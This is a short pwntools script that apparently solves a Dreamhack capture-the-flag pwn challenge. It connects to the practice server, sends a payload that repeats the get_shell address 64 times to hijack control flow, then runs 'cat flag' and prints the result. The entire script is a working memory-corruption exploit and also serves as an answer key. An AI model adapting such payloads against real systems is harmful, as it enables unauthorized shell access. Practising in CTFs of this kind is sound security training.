from pwn import *
r = remote("host1.dreamhack.games", 14119)

addr = 0x80485db # get_shell addr

payload = p32(addr) * 0x40 # 256 bytes

r.sendline(payload)
r.recv()
r.sendline(b"cat flag")
flag = r.recvuntil("}").decode('utf-8')

print(flag)